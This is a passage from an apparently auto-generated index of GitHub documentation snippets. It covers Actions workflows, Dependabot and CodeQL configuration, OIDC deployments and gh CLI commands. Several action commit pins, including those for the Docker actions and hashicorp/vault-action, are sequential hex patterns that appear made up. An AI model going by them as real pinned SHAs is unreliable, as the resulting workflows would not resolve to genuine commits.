expect(page.locator('text=Error: Product not found')).toBeVisible();\n  });\n});\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Databases for C/C++ with Autobuild\nDESCRIPTION: This shell script demonstrates how to create a CodeQL database for C/C++ code using the `codeql database create` command with autobuild enabled. It sets `--language=cpp` and relies on CodeQL's autobuilder to automatically detect and execute the necessary build steps.  No `--command` option is used, allowing autobuild to be invoked.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ncodeql database create --language=cpp <output-folder>/cpp-database\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions workflow for building and deploying Docker to Azure\nDESCRIPTION: This YAML snippet represents a GitHub Actions workflow that builds and deploys a Docker container to Azure App Service. It is triggered on pushes to the `main` branch.  It requires the `AZURE_WEBAPP_NAME` environment variable to be set and the `AZURE_WEBAPP_PUBLISH_PROFILE` secret to be configured in the GitHub repository.  The workflow consists of two jobs: `build` to build and push the Docker image, and `deploy` to deploy the image to Azure Web App.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-docker-to-azure-app-service.md#_snippet_2\n\nLANGUAGE: YAML\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Build and deploy a container to an Azure Web App\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n\non:\n  push:\n    branches:\n      - main\n\npermissions:\n  contents: 'read'\n  packages: 'write'\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b\n\n      - name: Log in to GitHub container registry\n        uses: docker/login-action@8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d\n        with:\n          registry: ghcr.io\n          username: {% raw %}${{ github.actor }}{% endraw %}\n          password: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n\n      - name: Lowercase the repo name\n        run: echo \"REPO=${GITHUB_REPOSITORY,,}\" >>${GITHUB_ENV}\n\n      - name: Build and push container image to registry\n        uses: docker/build-push-action@9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f\n        with:\n          push: true\n          tags: ghcr.io/{% raw %}${{ env.REPO }}{% endraw %}:{% raw %}${{ github.sha }}{% endraw %}\n          file: ./Dockerfile\n\n  deploy:\n    runs-on: ubuntu-latest\n\n    needs: build\n\n    environment:\n      name: 'production'\n      url: {% raw %}${{ steps.deploy-to-webapp.outputs.webapp-url }}{% endraw %}\n\n    steps:\n      - name: Lowercase the repo name\n        run: echo \"REPO=${GITHUB_REPOSITORY,,}\" >>${GITHUB_ENV}\n\n      - name: Deploy to Azure Web App\n        id: deploy-to-webapp\n        uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n        with:\n          app-name: {% raw %}${{ env.AZURE_WEBAPP_NAME }}{% endraw %}\n          publish-profile: {% raw %}${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}{% endraw %}\n          images: 'ghcr.io/{% raw %}${{ env.REPO }}{% endraw %}:{% raw %}${{ github.sha }}{% endraw %}'\n```\n\n----------------------------------------\n\nTITLE: Suggesting Function Body using GitHub Copilot in C#\nDESCRIPTION: This code snippet demonstrates how GitHub Copilot can suggest a function body in a C# file after typing the function signature. The user types `int CalculateDaysBetweenDates(` and Copilot suggests the function body. This is an example of automatic code completion provided by Copilot.  The user can accept the suggestion to have Copilot complete the function body.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_3\n\nLANGUAGE: C#\nCODE:\n```\nint CalculateDaysBetweenDates(\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies with Yarn\nDESCRIPTION: This example shows how to install dependencies using Yarn without the `--frozen-lockfile` option. This will install the dependencies defined in the `package.json` file and update the `yarn.lock` file if necessary.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_7\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Use Node.js\n  uses: {% data reusables.actions.action-setup-node %}\n  with:\n    node-version: '20.x'\n- name: Install dependencies\n  run: yarn\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Workflow with GITHUB_TOKEN\nDESCRIPTION: This workflow demonstrates how to use the built-in `GITHUB_TOKEN` to authenticate with the GitHub REST API. It checks out the repository content, sets up Node.js, installs Octokit, sets the `GITHUB_TOKEN` to an environment variable named `TOKEN`, and executes a JavaScript script to interact with the API.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/quickstart.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_dispatch:\njobs:\n  use_api_via_script:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: read\n    steps:\n      - name: Check out repo content\n        uses: {% data reusables.actions.action-checkout %}\n\n      - name: Setup Node\n        uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '16.17.0'\n          cache: npm\n\n      - name: Install dependencies\n        run: npm install octokit\n\n      - name: Run script\n        run: |\n          node .github/actions-scripts/use-the-api.mjs\n        env:\n          TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Authenticate with admin:org scope via GitHub CLI\nDESCRIPTION: This snippet demonstrates how to authenticate the GitHub CLI with the `admin:org` scope, required for managing organization secrets. Use this command before setting or listing organization secrets.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ngh auth login --scopes \"admin:org\"\n```\n\n----------------------------------------\n\nTITLE: Defining Job Dependencies in GitHub Actions Workflow (YAML)\nDESCRIPTION: This YAML snippet defines job dependencies using the `needs` keyword in a GitHub Actions workflow. The `initial` job runs first, followed by `fanout1` and `fanout2` in parallel, and then `fanin` after both `fanout1` and `fanout2` have finished. It demonstrates how to create a dependency graph between jobs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-azure-pipelines-to-github-actions.md#_snippet_7\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  initial:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This job will be run first.\"\n  fanout1:\n    runs-on: ubuntu-latest\n    needs: initial\n    steps:\n      - run: echo \"This job will run after the initial job, in parallel with fanout2.\"\n  fanout2:\n    runs-on: ubuntu-latest\n    needs: initial\n    steps:\n      - run: echo \"This job will run after the initial job, in parallel with fanout1.\"\n  fanin:\n    runs-on: ubuntu-latest\n    needs: [fanout1, fanout2]\n    steps:\n      - run: echo \"This job will run after fanout1 and fanout2 have finished.\"\n```\n\n----------------------------------------\n\nTITLE: AWS Workflow using OIDC (YAML)\nDESCRIPTION: This YAML snippet demonstrates a GitHub Actions workflow that uses OpenID Connect (OIDC) to authenticate with AWS and upload a file to an S3 bucket. The workflow defines permissions for the id-token (write) and contents (read), configures AWS credentials using the `aws-actions/configure-aws-credentials` action, and then copies an `index.html` file to the specified S3 bucket.  Replace BUCKET-NAME, AWS-REGION and ROLE-TO-ASSUME with appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n# Sample workflow to access AWS resources when workflow is tied to branch\n# The workflow Creates static website using aws s3\nname: AWS example workflow\non:\n  push\nenv:\n  BUCKET_NAME : \"BUCKET-NAME\"\n  AWS_REGION : \"AWS-REGION\"\n# permission can be added at job level or workflow level\npermissions:\n  id-token: write   # This is required for requesting the JWT\n  contents: read    # This is required for actions/checkout\njobs:\n  S3PackageUpload:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Git clone the repository\n        uses: {`actions.action-checkout`}\n      - name: configure aws credentials\n        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502\n        with:\n          role-to-assume: ROLE-TO-ASSUME\n          role-session-name: samplerolesession\n          aws-region: `${{ env.AWS_REGION }}`\n      # Upload a file to AWS s3\n      - name: Copy index.html to s3\n        run: |\n          aws s3 cp ./index.html s3://${{ env.BUCKET_NAME }}/\n\n```\n\n----------------------------------------\n\nTITLE: Specifying Branches for Pull Request using gh CLI\nDESCRIPTION: This snippet demonstrates how to specify the base and head branches for a pull request using the `--base` and `--head` flags with the `gh pr create` command. The base branch is the target branch for merging, and the head branch contains the changes.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh pr create --base my-base-branch --head my-changed-branch\n```\n\n----------------------------------------\n\nTITLE: Bitbucket Pipeline Configuration File\nDESCRIPTION: This YAML configuration file defines source files for auditing Bitbucket pipelines. Each entry specifies a `repository_slug` (repository name) and the `path` to the source file.  All `repository_slug` values must be unique.  This file is used in conjunction with the `gh actions-importer audit` command and the `--config-file-path` argument.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\nsource_files:\n  - repository_slug: repo_name\n    path: path/to/one/source/file.yml\n  - repository_slug: another_repo_name\n    path: path/to/another/source/file.yml\n```\n\n----------------------------------------\n\nTITLE: Configuring Distribution Management for OSSRH in pom.xml (XML)\nDESCRIPTION: This XML snippet shows how to configure the `<distributionManagement>` section of the `pom.xml` file to deploy to the Maven Central Repository through the OSSRH hosting project. The `id` is set to `ossrh`, which is used by the `setup-java` action for authentication. It specifies the repository name and the deployment URL.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/publishing-packages/publishing-java-packages-with-maven.md#_snippet_0\n\nLANGUAGE: xml\nCODE:\n```\n<project ...>\n  ...\n  <distributionManagement>\n    <repository>\n      <id>ossrh</id>\n      <name>Central Repository OSSRH</name>\n      <url>https://oss.sonatype.org/service/local/staging/deploy/maven2/</url>\n    </repository>\n  </distributionManagement>\n</project>\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Action Syntax (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to use an action in a GitHub Actions workflow. It uses the `setup-python` action to configure the Python version and architecture. It illustrates migrating from Azure Pipelines tasks to GitHub Actions actions for setting up a Python environment.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-azure-pipelines-to-github-actions.md#_snippet_9\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  run_python:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-setup-python %}\n        with:\n          python-version: '3.7'\n          architecture: 'x64'\n      - run: python script.py\n```\n\n----------------------------------------\n\nTITLE: Generating SBOM Attestation for Binaries with GitHub Actions\nDESCRIPTION: This snippet shows how to use the `actions/attest-sbom` action in a GitHub Actions workflow to generate an attestation for a Software Bill of Materials (SBOM) associated with a binary file. It specifies the path to the binary using the `subject-path` parameter, and the path to the SBOM file using the `sbom-path` parameter.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\n- name: Generate SBOM attestation\n  uses: actions/attest-sbom@v1\n  with:\n    subject-path: 'PATH/TO/ARTIFACT'\n    sbom-path: 'PATH/TO/SBOM'\n```\n\n----------------------------------------\n\nTITLE: Defining Script Steps in GitHub Actions (YAML)\nDESCRIPTION: This YAML snippet illustrates how to define equivalent script steps in a GitHub Actions workflow. It uses the `run` key to execute commands and the `shell` key to specify the desired shell (bash, pwsh, powershell). The job is configured to run on a Windows virtual machine.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-azure-pipelines-to-github-actions.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  scripts:\n    runs-on: windows-latest\n    steps:\n      - run: echo \"This step runs in the default shell\"\n      - run: echo \"This step runs in bash\"\n        shell: bash\n      - run: Write-Host \"This step runs in PowerShell Core\"\n        shell: pwsh\n      - run: Write-Host \"This step runs in PowerShell\"\n        shell: powershell\n```\n\n----------------------------------------\n\nTITLE: Setting Environment Variable with Expression - YAML\nDESCRIPTION: Demonstrates how to set an environment variable using an expression in a GitHub Actions workflow. The expression will be evaluated, and its result will be assigned to the environment variable.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/evaluate-expressions-in-workflows-and-actions.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nenv:\n  MY_ENV_VAR: ${{ <expression> }}\n```\n\n----------------------------------------\n\nTITLE: Configuring Dependabot with dependabot.yml\nDESCRIPTION: This YAML configuration file demonstrates how to configure Dependabot to use a private registry, ignore a specific dependency (lodash), disable version updates, and define a group by package name for security updates for golang dependencies (when `dependabot-grouped-security-updates-config` is enabled).\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-security-updates/configuring-dependabot-security-updates.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n# Example configuration file that:\n#  - Has a private registry\n#  - Ignores lodash dependency\n#  - Disables version-updates\n{% ifversion dependabot-grouped-security-updates-config %}#  - Defines a group by package name, for security updates for golang dependencies{%- endif %}\n\nversion: 2\nregistries:\n  example:\n    type: npm-registry\n    url: https://example.com\n    token: {% raw %}${{secrets.NPM_TOKEN}}{% endraw %}\nupdates:\n  - package-ecosystem: \"npm\"\n    directory: \"/src/npm-project\"\n    schedule:\n      interval: \"daily\"\n    # For Lodash, ignore all updates\n    ignore:\n      - dependency-name: \"lodash\"\n    # Disable version updates for npm dependencies\n    open-pull-requests-limit: 0\n    registries:\n      - example\n  {% ifversion dependabot-grouped-security-updates-config %}- package-ecosystem: \"gomod\"\n    groups:\n      golang:\n        applies-to: security-updates\n        patterns:\n          - \"golang.org*\"{% endif %}\n\n```\n\n----------------------------------------\n\nTITLE: Linting and formatting code with Ruff\nDESCRIPTION: This snippet installs Ruff, a Python linter and formatter, and uses it to check and format code.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-python.md#_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Set up Python\n  uses: {% data reusables.actions.action-setup-python %}\n  with:\n    python-version: '3.x'\n- name: Install the code linting and formatting tool Ruff\n  run: pipx install ruff\n- name: Lint code with Ruff\n  run: ruff check --output-format=github --target-version=py39\n- name: Check code formatting with Ruff\n  run: ruff format --diff --target-version=py39\n  continue-on-error: true\n```\n\n----------------------------------------\n\nTITLE: List accessible repositories for user\nDESCRIPTION: This snippet fetches and iterates through the repositories that the application can access for the authenticated user.  It determines the access type (read or write) based on repository permissions and prints details about the repository. It depends on a properly authenticated Octokit client.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/discovering-resources-for-a-user.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nclient.repositories.each do |repository|\n  full_name = repository[:full_name]\n  has_push_access = repository[:permissions][:push]\n\n  access_type = if has_push_access\n                  \"write\"\n                else\n                  \"read-only\"\n                end\n\n  puts \"User has #{access_type} access to #{full_name}.\"\nend\n```\n\n----------------------------------------\n\nTITLE: Referencing Action from Different Repository in Workflow (YAML)\nDESCRIPTION: This snippet shows how to reference an action from a different repository within a GitHub Actions workflow file. The `uses` keyword specifies the owner, repository, and ref (tag, branch, or commit SHA) of the action to use. This example utilizes a placeholder for the action's setup node.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/using-pre-written-building-blocks-in-your-workflow.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n```yaml\njobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: {% data reusables.actions.action-setup-node %}\n```\n```\n\n----------------------------------------\n\nTITLE: Workflow Using `steps` Context - YAML\nDESCRIPTION: This YAML workflow demonstrates the usage of the `steps` context. The `generate_number` step creates an output called `random_number`. The subsequent step then accesses this output using the `steps` context to determine whether to pass or fail based on the value of the random number.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\nname: Generate random failure\non: push\njobs:\n  randomly-failing-job:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Generate 0 or 1\n        id: generate_number\n        run: echo \"random_number=$(($RANDOM % 2))\" >> $GITHUB_OUTPUT\n      - name: Pass or fail\n        run: |\n          if [[ {% raw %}${{ steps.generate_number.outputs.random_number }}{% endraw %} == 0 ]]; then exit 0; else exit 1; fi\n```\n\n----------------------------------------\n\nTITLE: Defining Input Parameters with `jobs.<job_id>.steps[*].with` in YAML\nDESCRIPTION: This YAML snippet demonstrates how to define input parameters for a GitHub Action using the `jobs.<job_id>.steps[*].with` syntax. It sets the `first_name`, `middle_name`, and `last_name` parameters for the `actions/hello_world` action, which will be available as environment variables within the action's execution context.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_26\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  my_first_job:\n    steps:\n      - name: My first step\n        uses: actions/hello_world@main\n        with:\n          first_name: Mona\n          middle_name: The\n          last_name: Octocat\n```\n\n----------------------------------------\n\nTITLE: Configuring Vault Action and Revoking Token in GitHub Actions (YAML)\nDESCRIPTION: This YAML snippet configures a GitHub Actions job to retrieve secrets from Vault using the `hashicorp/vault-action`. It sets the `exportToken` option to `true` to export the Vault token as an environment variable. It includes steps to retrieve the secret and then revoke the token using a shell script.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault.md#_snippet_5\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  retrieve-secret:\n    runs-on: ubuntu-latest\n    permissions:\n      id-token: write\n      contents: read\n    steps:\n      - name: Retrieve secret from Vault\n        uses: hashicorp/vault-action@9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b\n        with:\n          exportToken: true\n          method: jwt\n          url: VAULT-URL\n          role: ROLE-NAME\n          secrets: SECRET-PATH\n\n      - name: Use secret from Vault\n        run: |\n          # This step has access to the secret retrieved above; see hashicorp/vault-action for more details.\n\n      - name: Revoke token\n        # This step always runs at the end regardless of the previous steps result\n        if: always()\n        run: |\n          curl -X POST -sv -H \"X-Vault-Token: {% raw %}${{ env.VAULT_TOKEN }}{% endraw %}\" \\\n            VAULT-URL/v1/auth/token/revoke-self\n```\n\n----------------------------------------\n\nTITLE: Uploading CodeQL Results with GITHUB_TOKEN - Shell\nDESCRIPTION: This snippet shows how to upload CodeQL analysis results using the `codeql github upload-results` command when a {% data variables.product.prodname_github_app %} or {% data variables.product.pat_generic %} is available in the `GITHUB_TOKEN` environment variable. The `--github-auth-stdin` option is omitted. Ensure the repository, ref, commit, and SARIF file paths are correctly specified. It requires CodeQL CLI to be installed and the `GITHUB_TOKEN` environment variable to be set.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/uploading-codeql-analysis-results-to-github.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncodeql github upload-results \\\n    --repository=<repository-name> \\\n    --ref=<ref> --commit=<commit> \\\n    --sarif=<file> {% ifversion ghes %}--github-url=<URL> \\\n    {% endif %}\n```\n\n----------------------------------------\n\nTITLE: GitHub Packages Registry Configuration\nDESCRIPTION: This YAML snippet configures Dependabot to use a GitHub Packages registry. It specifies the registry type, URL, and token.  Requires a GitHub token with `packages:read` scope.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_26\n\nLANGUAGE: YAML\nCODE:\n```\nregistries:\n  github:\n    type: npm-registry\n    url: https://npm.pkg.github.com\n    token: ${{ secrets.<token> }}\n```\n\n----------------------------------------\n\nTITLE: Setting GITHUB_TOKEN permissions in GitHub Actions\nDESCRIPTION: This YAML snippet demonstrates how to modify the default read-only permissions of the GITHUB_TOKEN for GitHub Actions workflows triggered by Dependabot. It utilizes the `permissions` key to grant specific scopes, such as `pull-requests: write` and `issues: write`, allowing the workflow to perform actions that require write access. This configuration enables workflows to interact with pull requests and issues.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/troubleshooting-dependabot/troubleshooting-dependabot-on-github-actions.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\nname: CI\non: pull_request\n\n# Set the access for individual scopes, or use permissions: write-all\npermissions:\n  pull-requests: write\n  issues: write\n  ...\n```\n\n----------------------------------------\n\nTITLE: Generating Code from Comments using GitHub Copilot in C#\nDESCRIPTION: This code snippet illustrates how GitHub Copilot can generate C# code based on a natural language comment. The user provides a comment describing the desired functionality (finding all images in an XML document), and Copilot suggests the corresponding code implementation. Requires .NET environment and access to GitHub Copilot.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_4\n\nLANGUAGE: C#\nCODE:\n```\nusing System.Xml.Linq;\n\nvar doc = XDocument.Load(\"index.xhml\");\n\n// find all images\n```\n\n----------------------------------------\n\nTITLE: CodeQL Analysis Workflow in a Container - YAML\nDESCRIPTION: This YAML workflow configures GitHub Actions to run CodeQL analysis within a specified container. It defines the container image, sets permissions, specifies the language matrix, and includes steps for checking out the repository, initializing CodeQL, building the code, and performing the analysis. The workflow is triggered on push, pull request, and a scheduled cron job.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/running-codeql-code-scanning-in-a-container.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: \"{% data variables.product.prodname_codeql %}\"\n\non:\n  push:\n    branches: [main]\n  pull_request:\n    branches: [main]\n  schedule:\n    - cron: '15 5 * * 3'\n\njobs:\n  analyze:\n    name: Analyze\n    runs-on: ubuntu-latest\n    permissions:\n      security-events: write\n      actions: read\n\n    strategy:\n      fail-fast: false\n      matrix:\n        language: [java-kotlin]\n\n    # Specify the container in which actions will run\n    container:\n      image: codeql-container:f0f91db\n\n    steps:\n      - name: Checkout repository\n        uses: {% data reusables.actions.action-checkout %}\n      - name: Initialize {% data variables.product.prodname_codeql %}\n        uses: {% data reusables.actions.action-codeql-action-init %}\n        with:\n          languages: {% raw %}${{ matrix.language }}{% endraw %}\n      - name: Build\n        run: |\n          ./configure\n          make\n      - name: Perform {% data variables.product.prodname_codeql %} Analysis\n        uses: {% data reusables.actions.action-codeql-action-analyze %}\n```\n\n----------------------------------------\n\nTITLE: Deleting a Group via SCIM REST API\nDESCRIPTION: This snippet represents the HTTP DELETE request used to completely delete an existing group in GitHub using the SCIM API.  The request requires the group's `id`.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/provisioning-users-and-groups-with-scim-using-the-rest-api.md#_snippet_6\n\nLANGUAGE: HTTP\nCODE:\n```\nDELETE /scim/v2/{% ifversion ghec %}enterprises/{enterprise}/{% endif %}Groups/{scim_group_id}\n```\n\n----------------------------------------\n\nTITLE: Using Cmd.exe shell with Secrets in GitHub Actions\nDESCRIPTION: This YAML snippet demonstrates how to use secrets in Cmd.exe within a GitHub Actions workflow. It sets a secret as an environment variable and uses it in a Cmd.exe command, quoting the variable for safety.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - shell: cmd\n    env:\n      SUPER_SECRET: ${{ secrets.SuperSecret }}\n    run: |\n      example-command \"%SUPER_SECRET%\"\n```\n\n----------------------------------------\n\nTITLE: Defining a Scheduled Workflow for Issue Creation (YAML)\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow that creates an issue on a weekly schedule. The `on.schedule` trigger defines the cron schedule, and the `jobs.create_issue` job contains the steps to create the issue using the `gh` CLI. It also includes environment variables for configuring the issue's title, assignees, labels, and body. Permissions are set to allow writing to issues.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/project-management/scheduling-issue-creation.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Weekly Team Sync\non:\n  schedule:\n    - cron: 20 07 * * 1\n\njobs:\n  create_issue:\n    name: Create team sync issue\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n    steps:\n      - name: Create team sync issue\n        run: |\n          if [[ $CLOSE_PREVIOUS == true ]]; then\n            previous_issue_number=$(gh issue list \\\n              --label \"$LABELS\" \\\n              --json number \\\n              --jq '.[0].number')\n            if [[ -n $previous_issue_number ]]; then\n              gh issue close \"$previous_issue_number\"\n              gh issue unpin \"$previous_issue_number\"\n            fi\n          fi\n          new_issue_url=$(gh issue create \\\n            --title \"$TITLE\" \\\n            --assignee \"$ASSIGNEES\" \\\n            --label \"$LABELS\" \\\n            --body \"$BODY\")\n          if [[ $PINNED == true ]]; then\n            gh issue pin \"$new_issue_url\"\n          fi\n        env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n          GH_REPO: {% raw %}${{ github.repository }}{% endraw %}\n          TITLE: Team sync\n          ASSIGNEES: monalisa,doctocat,hubot\n          LABELS: weekly sync,docs-team\n          BODY: |\n            ### Agenda\n\n            - [ ] Start the recording\n            - [ ] Check-ins\n            - [ ] Discussion points\n            - [ ] Post the recording\n\n            ### Discussion Points\n            Add things to discuss below\n\n            - [Work this week](https://github.com/orgs/github/projects/3)\n          PINNED: false\n          CLOSE_PREVIOUS: false\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Registry Authentication String\nDESCRIPTION: This snippet shows an example of a registry authentication string used to authenticate to multiple container registries.  It uses comma separated <registry-url>=<token> pairs. It includes authentication for both GitHub.com and GitHub Enterprise Server registries.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/publishing-and-using-codeql-packs.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nhttps://ghcr.io/v2/=<token1>,{% data variables.enterprise.gh_enterprise_container_registry %}=<token2>\n```\n\n----------------------------------------\n\nTITLE: Configuring Dependabot for Security Updates Only (YAML)\nDESCRIPTION: This example demonstrates a `dependabot.yml` configuration that uses a private npm registry, disables version updates, applies custom labels, adds reviewers and assignees, and optionally groups security updates for golang dependencies. It customizes pull requests for security updates only by setting `open-pull-requests-limit` to `0`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/dependabot-security-updates/customizing-dependabot-security-prs.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Example configuration file that:\n#  - Uses a private registry for npm updates\n#  - Ignores lodash dependency\n#  - Disables version-updates\n#  - Applies custom labels\n#  - Adds reviewers and assignees\n{% ifversion dependabot-grouped-security-updates-config %}#  - Group security updates for golang dependencies into a single pull request{%- endif %}\n\nversion: 2\nregistries:\n  # Define a private npm registry with the name `example`\n  example:\n    type: npm-registry\n    url: https://example.com\n    token: {% raw %}${{secrets.NPM_TOKEN}}{% endraw %}\nupdates:\n  - package-ecosystem: \"npm\"\n    directory: \"/src/npm-project\"\n    schedule:\n      interval: \"daily\"\n    # For Lodash, ignore all updates\n    ignore:\n      - dependency-name: \"lodash\"\n    # Disable version updates for npm dependencies\n    open-pull-requests-limit: 0\n    registries:\n      # Ask Dependabot to use the private registry for npm\n      - example\n    # Raise all npm pull requests for security updates with custom labels\n    labels:\n      - \"npm dependencies\"\n      - \"triage-board\"\n    # Raise all npm pull requests for security updates with reviewers\n    reviewers:\n      - \"my-org/team-name\"\n      - \"octocat\"\n    # Raise all npm pull requests for security updates with assignees\n    assignees:\n      - \"user-name\"\n  {% ifversion dependabot-grouped-security-updates-config %}- package-ecosystem: \"gomod\"\n    groups:\n      # Group security updates for golang dependencies\n      # into a single pull request\n      golang:\n        applies-to: security-updates\n        patterns:\n          - \"golang.org*\"{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Deploying to GKE using Kustomize and Kubectl\nDESCRIPTION: These commands deploy a Docker image to a GKE cluster using Kustomize and Kubectl. It edits the Kustomize configuration to set the image to the newly built and pushed image, builds the Kustomize configuration, and applies it to the cluster using `kubectl apply`. It then checks the rollout status and gets the service information.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\n./kustomize edit set image gcr.io/PROJECT_ID/IMAGE:TAG=gcr.io/$PROJECT_ID/$IMAGE:$GITHUB_SHA\n./kustomize build . | kubectl apply -f -\nkubectl rollout status deployment/$DEPLOYMENT_NAME\nkubectl get services -o wide\n```\n\n----------------------------------------\n\nTITLE: Connecting to Redis and Populating Data with 